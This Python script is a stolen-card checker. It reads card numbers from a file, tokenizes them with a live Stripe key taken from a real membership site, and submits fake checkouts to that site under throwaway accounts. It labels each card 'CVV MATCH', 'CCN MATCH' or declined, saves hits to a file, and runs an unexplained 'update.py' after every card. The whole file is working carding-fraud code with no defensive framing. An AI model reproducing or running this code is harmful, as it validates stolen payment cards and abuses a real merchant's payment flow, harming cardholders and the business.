import aiohttp
import asyncio
import random
import string
import uuid
import re
import traceback
import time
import subprocess


MAX_RETRIES = 3
RETRY_SLEEP_TIME = 1
file_path = 'update.py'


async def find_between(data, first, last):
  try:
    start = data.index(first) + len(first)
    end = data.index(last, start)
    return data[start:end]
  except ValueError:
    return None


class bcolors:
  HEADER = "\033[95m"
  OKBLUE = "\033[94m"
  OKCYAN = "\033[96m"
  OKGREEN = "\033[92m"
  WARNING = "\033[93m"
  FAIL = "\033[91m"
  ENDC = "\033[0m"
  BOLD = "\033[1m"
  UNDERLINE = "\033[4m"
  RED = "\033[31m"
  GREEN = "\033[32m"


def luhn_check(card_number):
  digits = [int(d) for d in str(card_number)]

  for i in range(len(digits) - 2, -1, -2):
    digits[i] *= 2
    if digits[i] > 9:
      digits[i] -= 9

  checksum = sum(digits)

  return checksum % 10 == 0


def getcards(text: str):

  input = re.findall(r"[0-9]+", text.replace("CCV2", ""))
  if not input or len(input) < 3:
    return None, None, None, None, "invalid_input"

  if len(input) == 3:
    cc = input[0]
    if len(input[1]) == 3:
      mes = input[2][:2]
      ano = input[2][2:]
      cvv = input[1]
    else:
      mes = input[1][:2]
      ano = input[1][2:]
      cvv = input[2]
  else:
    cc = input[0]
    if len(input[1]) == 3:
      mes = input[2]
      ano = input[3]
      cvv = input[1]
    else:
      mes = input[1]
      ano = input[2]
      cvv = input[3]
    if len(mes) == 2 and (mes > "12" or mes < "01"):
      ano1 = mes
      mes = ano
      ano = ano1
  if not luhn_check(cc):
    return None, None, None, None, "invalid_luhn"
  if cc[0] == 3 and len(cc) not in [15, 16] or int(cc[0]) not in [3, 4, 5, 6]:
    return None, None, None, None, "invalid_card_number"
  if (len(mes) not in [2, 4] or len(mes) == 2 and mes > "12"
      or len(mes) == 2 and mes < "01"):
    return None, None, None, None, "invalid_card_month"
  if (len(ano) not in [2, 4] or len(ano) == 2 and ano < "23"
      or len(ano) == 4 and ano < "2023" or len(ano) == 2 and ano > "30"
      or len(ano) == 4 and ano > "2030"):
    return None, None, None, None, "invalid_card_year"
  if cc[0] == 3 and len(cvv) != 4 or len(cvv) != 3:
    return None, None, None, None, "invalid_card_cvv"

  if (cc, mes, ano, cvv):
    if len(ano) == 2:
      ano = "20" + str(ano)
    return cc, mes, ano, cvv, False


async def make_payment_request(cc, mes, ano, cvv):
  try:
    async with aiohttp.ClientSession() as session:
      headers = {
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
          "Accept": "application/json",
          "Accept-Language": "en-US,en;q=0.5",
          "Referer": "https://js.stripe.com/",
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://js.stripe.com",
          "DNT": "1",
          "Connection": "keep-alive",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-site",
      }

      data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano[-2:]}&guid={str(uuid.uuid4)}&muid={str(uuid.uuid4)}&sid={str(uuid.uuid4)}&pasted_fields=number&payment_user_agent=stripe.js%2Ff7fbf3e687%3B+stripe-js-v3%2Ff7fbf3e687%3B+split-card-element&referrer=https%3A%2F%2Faheadoftimeacademy.com&time_on_page=63547&key=pk_live_P3ZfKZGVVEy37CUBlwBFZ3oJ00x1l4WeEp"

      async with session.post("https://api.stripe.com/v1/payment_methods",
                              headers=headers,
                              data=data) as response:
        return await response.text()
  except aiohttp.ClientError as e:
    print("An error occurred while making payment request:", e)
    return None


async def process_payment_response(response):
  if response is None:
    return None, None, "Request Error: No response received"

  try:
    id = await find_between(response, '"id": "', '"')
    brand = await find_between(response, '"brand": "', '"')
    return id, brand, None
  except Exception as e:
    print("An error occurred while processing payment response:", e)
    return None, None, "Response Error: Unexpected format"


async def make_checkout_request(id, brand, cc, mes, ano):
  try:
    async with aiohttp.ClientSession() as session:
      headers = {
          "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
          "Accept":
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://aheadoftimeacademy.com",
          "DNT": "1",
          "Connection": "keep-alive",
          "Referer":
          "https://aheadoftimeacademy.com/membership-account/membership-checkout",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-User": "?1",
      }
      meeq = f"20{ano[-2:]}".replace("2020", "20")
      num = random.randint(1000, 9999)
      email = "".join(
          random.choice(string.ascii_lowercase)
          for i in range(10)) + random.choice([
              "@gmail.com",
              "@outlook.com",
              "@yahoo.com",
              "@hotmail.com",
          ])
      data = {
          "level": "1",
          "checkjavascript": "1",
          "other_discount_code": "",
          "username": f"ariesxd{num}",
          "password": f"aries{num}",
          "password2": f"aries{num}",
          "bemail": email,
          "bconfirmemail": email,
          "fullname": "",
          "CardType": brand,
          "discount_code": "",
          "submit-checkout": "1",
          "javascriptok": "1",
          "payment_method_id": id,
          "AccountNumber": f"XXXXXXXXXXXX{cc[-4:]}",
          "ExpirationMonth": mes,
          "ExpirationYear": meeq,
      }
      async with session.post(
          "https://aheadoftimeacademy.com/membership-account/membership-checkout",
          headers=headers,
          data=data,
      ) as response:
        return await response.text()
  except aiohttp.ClientError as e:
    print("An error occurred while making checkout request:", e)
    return None


async def process_checkout_response(response):
  if response is None:
    return "Request Error: No response received"

  try:
    result = response
    if ("Thank you for your membership." in result
        or "Membership Confirmation" in result
        or "Thank You For Donation." in result or "Success " in result
        or '"type":"one-time"' in result
        or "/donations/thank_you?donation_number=" in result):
      return "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", "✅", "CVV MATCH"
    elif (
        "Error updating default payment method.Your card does not support this type of purchase."
        in result
        or "Your card does not support this type of purchase." in result
        or "transaction_not_allowed" in result
        or "insufficient_funds" in result or "incorrect_zip" in result
        or "Your card has insufficient funds." in result
        or '"status":"success"' in result
        or "stripe_3ds2_fingerprint" in result
        or "security code is incorrect." in result
        or "security code is invalid." in result):
      msg = await find_between(
          result,
          '<div id="pmpro_message" class="pmpro_message pmpro_error">',
          "</div>",
      )
      return "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿", "✅", f"CCN MATCH - {msg}"
    else:
      msg = await find_between(
          result,
          '<div id="pmpro_message" class="pmpro_message pmpro_error">',
          "</div>",
      )
      return "DECLINE", "❌", msg
  except Exception as e:
    print("An error occurred while processing checkout response:", e)
    return "Response Error: Unexpected format"


async def stripe(cc, mes, ano, cvv):
  retries = 0
  while retries < MAX_RETRIES:
    payment_response = await make_payment_request(cc, mes, ano, cvv)
    id, brand, payment_error = await process_payment_response(payment_response)
    if id and brand:
      checkout_response = await make_checkout_request(id, brand, cc, mes, ano)
      return await process_checkout_response(checkout_response)
    else:
      print("Payment Error:", payment_error)

    retries += 1
    if retries < MAX_RETRIES:
      await asyncio.sleep(RETRY_SLEEP_TIME)
    else:
      print("Max retries exceeded. Exiting.")


async def process_cc_list(cc_list):
  for cards in cc_list:
    st = int(time.time())
    cc, mes, ano, cvv = cards
    xx = "|".join(cards)
    try:
      data = await stripe(cc, mes, ano, cvv)
    except Exception as exc:
      traceback.print_exc()
      r_text, r_logo, r_respo = exc, "❌", "DECLINED"
    else:
      if isinstance(data, tuple):
        r_text, r_logo, r_respo = data
      else:
        r_text, r_logo, r_respo = data, "❌", "DECLINED"
    if "✅" in r_logo:
      with open("ip.txt", "a+") as f:
        f.write(f"{xx}:{r_text}\n", f"{mes} ")
        subprocess.run(['python', file_path])
      print(
          f"\n{bcolors.GREEN}Response: {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
      )

    else:
      subprocess.run(['python', file_path])
      print(
          f"\n{bcolors.RED}Response: {r_text} {r_logo} {r_respo} For CC: {cc}|{mes}|{ano}|{cvv} Time Taken: {int(time.time() - st)} seconds{bcolors.ENDC}\n"
      )


if __name__ == "__main__":
  try:
    with open("3n.txt", "r", encoding="utf-8") as file:
      lista = file.read().splitlines()
  except FileNotFoundError as e:
    print(
        f"{bcolors.RED}FILE NOT FOUND. MAKE SURE YOUR FILE EXISTS{bcolors.ENDC}"
    )
    quit()

  print(f"{bcolors.OKBLUE}TOTAL CARDS DETECTED: {len(lista)}{bcolors.ENDC}")

  cc_list = []
  for x in lista:
    chk = getcards(x)
    cc, mes, ano, cvv, check = chk
    if not check:
      cc_list.append([cc, mes, ano, cvv])

  print(
      f"{bcolors.OKBLUE}TOTAL CARDS TO BE CHECKED: {len(cc_list)}{bcolors.ENDC}"
  )

  total = len(cc_list)
  asyncio.run(process_cc_list(cc_list))
